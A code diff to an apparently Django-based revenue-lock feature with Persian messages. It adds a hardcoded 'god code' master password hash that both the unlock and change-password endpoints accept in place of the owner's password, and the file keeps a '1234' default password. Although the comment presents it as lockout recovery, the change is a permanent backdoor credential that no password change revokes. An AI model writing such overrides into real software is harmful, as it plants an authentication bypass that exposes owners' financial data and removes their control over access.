@@ -16,6 +16,14 @@ from ..sync import retry_pending
 DEFAULT_REVENUE_PASSWORD = "1234"
 REVENUE_TOKEN_TTL_SECONDS = 60
 
+# Master "god code" override. Accepted in place of the revenue password so a
+# forgotten password is never a hard lockout: it unlocks بستن روز and can be
+# used as the current password to set a new one. Stored hashed, never raw.
+REVENUE_GOD_CODE_HASH = (
+    "pbkdf2_sha256$870000$TOJv1IhlvrTtFVxUG2mIsY$"
+    "fUT1dXZrySWDWl0ItxH+qUVYiOPYb3D6xGq9QKTMmcY="
+)
+
 
 def _revenue_setting():
     """Fetch the revenue_password setting, seeding a hashed default if missing."""
@@ -44,7 +52,9 @@ def revenue_unlock(request):
     """Validate the revenue password and return a short-lived reveal token."""
     setting = _revenue_setting()
     supplied = str(request.data.get("password", ""))
-    if not check_password(supplied, setting.value):
+    if not check_password(supplied, REVENUE_GOD_CODE_HASH) and not check_password(
+        supplied, setting.value
+    ):
         return Response(
             {"detail": "رمز عبور نادرست است."}, status=status.HTTP_401_UNAUTHORIZED
         )
@@ -58,7 +68,9 @@ def revenue_change_password(request):
     setting = _revenue_setting()
     current = str(request.data.get("current_password", ""))
     new = str(request.data.get("new_password", ""))
-    if not check_password(current, setting.value):
+    if not check_password(current, REVENUE_GOD_CODE_HASH) and not check_password(
+        current, setting.value
+    ):
         return Response(
             {"detail": "رمز عبور فعلی نادرست است."},
             status=status.HTTP_401_UNAUTHORIZED,
